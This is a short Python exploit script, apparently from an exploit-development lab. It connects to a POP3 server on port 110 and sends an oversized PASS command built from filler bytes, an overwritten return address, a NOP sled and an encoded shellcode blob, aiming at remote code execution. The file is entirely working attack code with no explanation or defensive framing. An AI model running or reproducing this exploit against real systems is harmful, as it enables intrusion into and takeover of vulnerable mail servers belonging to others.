import socket
import struct

s = socket.socket()
s.connect(('192.168.1.30',110))

print(s.recv(1024))

total = 3500
offset = 2606

buf =  b""
buf += b"\xd9\xca\xb8\x95\xb5\x1f\xac\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x59\x31\x43\x19\x83\xeb\xfc\x03\x43\x15\x77"
buf += b"\x40\xe3\x44\xf8\xab\x1c\x95\x66\x25\xf9\xa4\xb4\x51"
buf += b"\x89\x95\x08\x11\xdf\x15\xe3\x77\xf4\x14\x0c\xfc\x86"
buf += b"\x7e\xfd\xb4\x2d\x59\x30\x7b\x1d\x99\x53\x07\x5c\xce"
buf += b"\xb3\x36\xaf\x03\xb2\x7f\x79\x69\x5b\x2d\x2d\x1a\xf1"
buf += b"\xc2\x5a\x5e\xc9\xe3\x8c\xd4\x71\x9c\xa9\x2b\x05\x10"
buf += b"\xb3\x7b\x6e\xe0\xab\x2b\xfb\xa9\xeb\xca\x28\xcc\x25"
buf += b"\xb8\xf2\x86\x84\xbe\x81\x2d\x6c\x41\x43\x7c\xb2\xee"
buf += b"\xaa\xb0\x3f\xee\xeb\x77\xa0\x85\x07\x84\x5d\x9e\xdc"
buf += b"\xf6\xb9\x2b\xc2\x51\x49\x8b\x26\x63\x9e\x4a\xad\x6f"
buf += b"\x6b\x18\xe9\x73\x6a\xcd\x82\x88\xe7\xf0\x44\x19\xb3"
buf += b"\xd6\x40\x41\x67\x76\xd1\x2f\xc6\x87\x01\x97\xb7\x2d"
buf += b"\x4a\x3a\xa1\x52\xb3\xc4\xce\x0e\x23\x08\x03\xb1\xb3"
buf += b"\x06\x14\xc2\x81\x89\x8e\x4c\xa9\x42\x09\x8a\xb8\x45"
buf += b"\xaa\x44\x02\x05\x54\x65\x72\x0f\x93\x31\x22\x27\x32"
buf += b"\x3a\xa9\xb7\xbb\xef\x47\xb2\x2b\xd0\x3f\xc3\xa5\xb8"
buf += b"\x3d\xc4\xa8\x64\xc8\x22\x9a\xc4\x9a\xfa\x5b\xb5\x5a"
buf += b"\xab\x33\xdf\x55\x94\x24\xe0\xbc\xbd\xcf\x0f\x68\x95"
buf += b"\x67\xa9\x31\x6d\x19\x36\xec\x0b\x19\xbc\x04\xeb\xd4"
buf += b"\x35\x6d\xff\x01\x22\x8d\xff\xd1\xc7\x8d\x95\xd5\x41"
buf += b"\xda\x01\xd4\xb4\x2c\x8e\x27\x93\x2f\xc9\xd8\x62\x19"
buf += b"\xa1\xef\xf0\x25\xdd\x0f\x15\xa5\x1d\x46\x7f\xa5\x75"
buf += b"\x3e\xdb\xf6\x60\x41\xf6\x6b\x39\xd4\xf9\xdd\xed\x7f"
buf += b"\x92\xe3\xc8\x48\x3d\x1c\x3f\xcb\x3a\xe2\xbd\xe4\xe2"
buf += b"\x8a\x3d\xb5\x12\x4a\x54\x35\x43\x22\xa3\x1a\x6c\x82"
buf += b"\x4c\xb1\x25\x8a\xc7\x54\x87\x2b\xd7\x7c\x49\xf5\xd8"
buf += b"\x73\x52\x06\xa2\xfc\x65\xe7\x53\x15\x02\xe8\x53\x19"
buf += b"\x34\xd5\x85\x20\x42\x18\x16\x17\x5d\x2f\x3b\x3e\xf4"
buf += b"\x4f\x6f\x40\xdd"

shellcode = buf

new_eip = struct.pack("<I",0x5F4A358F)
nop_sled = b'\x90'*7

#all_char = ''.join(chr(i) for i in range(1,128)).encode()
#bad chars \x00\x0a\x0d

payload = [
    b'A'*(offset),
    new_eip,
    nop_sled,
    shellcode,
    b'C'*(total-offset-4-len(shellcode)-len(nop_sled))
]


payload = b"".join(payload)

s.send(b'USER b00m \r\n')
print(s.recv(1024))
s.send(b'PASS ' + payload + b'\r\n')
s.send(b'QUIT\r\n')
s.close()
